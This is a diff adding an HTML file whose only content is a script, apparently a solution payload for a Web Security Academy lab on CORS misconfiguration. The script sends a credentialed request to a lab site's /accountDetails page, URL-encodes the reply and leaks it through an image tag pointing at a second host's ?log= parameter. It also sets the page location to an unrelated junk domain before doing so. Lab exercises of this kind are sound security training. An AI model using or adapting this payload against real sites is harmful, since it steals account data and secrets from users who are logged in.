@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="ISO-8859-1">
+<title>Insert title here</title>
+</head>
+<body>
+<script>
+	var xhr = new XMLHttpRequest();
+	var response ="test";
+	document.location="http://fcuk.off"
+
+	xhr.open('GET', "https://aca61f051e0346c780c833d900200093.web-security-academy.net/accountDetails", false);
+
+	xhr.onreadystatechange = function()
+	{
+		if (this.readyState == 4 && this.status == 200)
+		{
+		  
+			response = encodeURI(this.responseText);
+		}
+	};
+	xhr.withCredentials = true;
+	xhr.send();
+	document.write("<img src=https://ac2e1f331e3246dc808e333e012c0075.web-security-academy.net/?log="+response+">")
+
+</script>
+</body>
+</html>
